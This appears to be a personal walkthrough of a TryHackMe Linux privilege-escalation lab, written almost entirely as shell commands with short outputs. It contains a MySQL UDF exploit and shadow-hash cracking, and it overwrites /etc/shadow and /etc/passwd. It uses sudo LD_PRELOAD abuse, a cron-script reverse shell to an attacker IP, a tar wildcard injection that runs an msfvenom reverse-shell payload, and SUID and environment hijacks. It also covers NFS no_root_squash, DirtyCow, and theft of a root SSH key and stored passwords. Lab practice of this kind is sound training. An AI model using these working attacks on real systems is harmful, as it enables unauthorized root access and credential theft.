# THM - Linux PrivEsc

<br>

## Task 1

```shell
ssh -oHostKeyAlgorithms=+ssh-rsa user@10.10.145.103
	yes
	password321
```

### Task 1.2

```shell
	id
```

> uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

<br>

## Task 2

https://www.exploit-db.com/exploits/1518

```shell
	cd /home/user/tools/mysql-udf
	ls
	
	gcc -g -c raptor_udf2.c -fPIC
	gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
	
	mysql -u root
		
		use mysql;
		create table foo(line blob);
		insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
		select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
		
		select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
		
		exit
		
	/tmp/rootbash -p
		
		whoami
		
		rm /tmp/rootbash
		exit
```

<br>

## Task 3

```shell
	ls -l /etc/shadow
```

### Task 3.1

```shell
	cat /etc/shadow
```

> $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0

### Task 3.2

```shell
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt

haiti '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0'
```

> sha512crypt

### Task 3.3

```shell
john hash.txt --format=sha512crypt --wordlist=../../Tools/KaliWordlists/rockyou.txt
```

> password123

```shell
(ssh:)
	su root
		password123
	
		exit
```

<br>

## Task 4

```shell
mkpasswd -m sha-512 DFTF@PConsole#
```

```shell
(ssh:)
	nano /etc/shadow
```

(edit:)
```txt
root:$6$q8SJ1T66Cx07PoNt$83RUZUNjggiqLeeQjogAH/K44raoNW0GHI864yctBtbqLQ3oZhCCCLcoR5rtEYQbY2y3uhyLqdzpaCyylTe.p.:17298:0:99999:7:::
```

```shell
(ssh:)
		^X
		y
		^Enter
	
	su root
		DFTF@PConsole#
	
		exit
```

<br>

## Task 5

```shell
openssl passwd DFTF-PConsole
```

```shell
(ssh:)
	nano /etc/passwd
```

```txt
root:$1$iCQE5h77$Oog3S0pqBpqTJIUKlff83/:0:0:root:/root:/bin/bash
```

```shell
(ssh:)
		^X
		y
		^Enter
	
	su root
		DFTF-PConsole
	
		exit
```

### Task 5.1

```shell
(ssh:)
		id
	
		exit
```

> uid=0(root) gid=0(root) groups=0(root)

<br>

## Task 6

### Task 6.1

```shell
(ssh:)
	sudo -l
```

> 11

### Task 6.2

🧰 https://gtfobins.github.io

> apache2

```shell
(ssh:)
	sudo vim -c ':!/bin/sh'
		whoami
	
		exit
		:q
		^Enter
```

<br>

## Task 7

```shell
(ssh:)
	sudo -l
		
	gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
	
	sudo LD_PRELOAD=/tmp/preload.so vim
		whoami
		
		exit
		:q
		^Enter
		
		
	ldd /usr/sbin/apache2
	
	gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
		
	sudo LD_LIBRARY_PATH=/tmp apache2
		whoami
	
		exit
```

<br>

## Task 8

```shell
(ssh:)
	cat /etc/crontab
	
	locate overwrite.sh
	
	ls -l /usr/local/bin/overwrite.sh
	
	nano /usr/local/bin/overwrite.sh
```

(edit:)
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.14.27.197/4444 0>&1
```

```shell
(ssh:)
	^X
	y
	^Enter
```

```shell
nc -nvlp 4444
	whoami
	
	exit
```

<br>

## Task 9

### Task 9.1

```shell
(ssh:)
	cat /etc/crontab
```

> /home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

```shell
(ssh:)
	nano /home/user/overwrite.sh
```

(edit:)
```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

```

```shell
(ssh:)
	^X
	y
	^Enter
	
	chmod +x /home/user/overwrite.sh
	
	/tmp/rootbash -p
		whoami
	
		rm /tmp/rootbash
		exit
```

<br>

## Task 10

🧰 https://gtfobins.github.io/gtfobins/tar/

```shell
(ssh:)
	cat /usr/local/bin/compress.sh
```

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.14.27.197 LPORT=4444 -f elf -o shell.elf

scp -oHostKeyAlgorithms=+ssh-rsa shell.elf user@10.10.145.103:/home/user/
	password321
```

```shell
(ssh:)
	chmod +x /home/user/shell.elf
	
	touch /home/user/--checkpoint=1
	touch /home/user/--checkpoint-action=exec=shell.elf
```

```shell
nc -nvlp 4444
	whoami
	
	rm /home/user/shell.elf
	rm /home/user/--checkpoint=1
	rm /home/user/--checkpoint-action=exec=shell.elf
	
	exit
```

<br>

## Task 11

🧰 https://www.exploit-db.com/

```shell
(ssh:)
	find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

🧰 https://www.exploit-db.com/exploits/39535

```shell
(ssh:)
	/home/user/tools/suid/exim/cve-2016-1531.sh
		whoami
		
		exit
```

<br>

## Task 12

```shell
(ssh:)
	/usr/local/bin/suid-so
	
	strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
	
	mkdir /home/user/.config
	
	gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
	
	/usr/local/bin/suid-so
		whoami
	
		exit
```

<br>

## Task 13

```shell
(ssh:)
	/usr/local/bin/suid-env
	
	strings /usr/local/bin/suid-env
	
	gcc -o service /home/user/tools/suid/service.c
	
	PATH=.:$PATH /usr/local/bin/suid-env
		whoami
		
		exit
```

<br>

## Task 14

```shell
(ssh:)
	strings /usr/local/bin/suid-env2
	
	/bin/bash --version
	
	function /usr/sbin/service { /bin/bash -p; }
	export -f /usr/sbin/service
	
	/usr/local/bin/suid-env2
		whoami
		
		exit
```

<br>

## Task 15

```shell
(ssh:)
	env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
	
	/tmp/rootbash -p
		whoami
		
		rm /tmp/rootbash
		exit
```

<br>

## Task 16

### Task 16.1

```shell
(ssh:)
	cat ~/.*history | less
```

> mysql -h somehost.local -uroot -ppassword123

```shell
(ssh:)
	q
	
	su root
		password321
		whoami
		
		exit
```

<br>

## Task 17

```shell
(ssh:)
	ls /home/user
```

### Task 17.1

```shell
(ssh:)
	cat /home/user/myvpn.ovpn
```

> /etc/openvpn/auth.txt

```shell
(ssh:)
	cat /etc/openvpn/auth.txt
	
	su root
		password123
		whoami
		
		exit
```

<br>

## Task 18

```shell
(ssh:)
	ls -la /
	
	ls -l /.ssh
```

```shell
scp -oHostKeyAlgorithms=+ssh-rsa user@10.10.145.103:/.ssh/root_key ./
	password321
	
chmod 600 root_key

sudo ssh -oHostKeyAlgorithms=+ssh-rsa -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i root_key root@10.10.145.103
	whoami
	
	exit
```

<br>

## Task 19

### Task 19.1

```shell
(ssh:)
	cat /etc/exports
```

> no_root_squash

```shell
sudo su
	
	mkdir /tmp/nfs
	mount -o rw,vers=2 10.10.145.103:/tmp /tmp/nfs
	
	msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
	
	chmod +xs /tmp/nfs/shell.elf
```

```shell
(ssh:)
	/tmp/shell.elf
		whoami
		
		exit
```

<br>

## Task 20

```shell
(ssh:)
	perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
	
	gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
	./c0w
	
	/usr/bin/passwd
		whoami
		
		mv /tmp/bak /usr/bin/passwd
		exit
```

<br>

## Task 21

https://github.com/rebootuser/LinEnum

https://github.com/carlospolop/PEASS-ng

https://github.com/diego-treitos/linux-smart-enumeration

```shell
(ssh:)
	ls /home/user/tools/privesc-scripts/
	
	mkdir /home/user/privesc-scripts-output
	
	/home/user/tools/privesc-scripts/LinEnum.sh | tee privesc-scripts-output/LinEnum
	
	/home/user/tools/privesc-scripts/linpeas.sh | tee privesc-scripts-output/linpeas
	
	/home/user/tools/privesc-scripts/lse.sh | tee privesc-scripts-output/lse
	
	exit
```

```shell
scp -oHostKeyAlgorithms=+ssh-rsa -r user@10.10.145.103:/home/user/privesc-scripts-output ./
	password321
```

<br>

```shell
scp -oHostKeyAlgorithms=+ssh-rsa -r user@10.10.145.103:/home/user/tools ./
	password321
```

